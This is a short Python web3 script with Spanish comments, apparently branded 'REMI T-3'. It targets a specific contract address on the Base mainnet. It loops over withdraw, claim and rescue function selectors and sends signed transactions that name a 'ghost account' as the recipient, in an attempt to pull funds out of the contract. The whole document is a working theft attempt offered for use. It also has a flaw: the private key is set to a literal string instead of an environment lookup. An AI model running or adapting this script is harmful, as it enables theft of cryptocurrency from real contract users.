from web3 import Web3

# Conexión a Base (donde está el contrato objetivo)
w3 = Web3(Web3.HTTPProvider('https://mainnet.base.org'))

# DATOS DEL OBJETIVO (Detectados por el Radar T-3)
contrato_objetivo = '0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf'
cuenta_fantasma = '0x7dab20b8e9113f873c3b715536e657ff93897b6b'

# TU LLAVE (Para pagar el gas de la operación)
priv_key = 'os.getenv("PRIVATE_KEY")'
acct = w3.eth.account.from_key(priv_key)

# Selectores de funciones comunes de retiro (withdraw, claim, rescue)
# REMI intentará disparar estas firmas para ver cuál abre el locker.
selectors = ['0x3fb674f1', '0x85117462', '0x1e83409a'] 

print(f"🕵️‍♂️ REMI T-3: INICIANDO EXTRACCIÓN SOBRE {contrato_objetivo}")

for func in selectors:
    print(f"🔑 Probando llave digital (selector): {func}")
    tx = {
        'from': acct.address,
        'to': contrato_objetivo,
        'nonce': w3.eth.get_transaction_count(acct.address),
        'gas': 100000,
        'gasPrice': w3.eth.gas_price,
        'data': func + cuenta_fantasma[2:].zfill(64), # Inyectamos tu cuenta fantasma como destino
        'chainId': 8453
    }
    
    try:
        signed = w3.eth.account.sign_transaction(tx, priv_key)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        print(f"🚀 ¡GATILLO DISPARADO! Hash: {tx_hash.hex()}")
        break # Si una funciona, paramos.
    except Exception as e:
        print(f"❌ Cerradura resistente a {func}. Probando siguiente...")

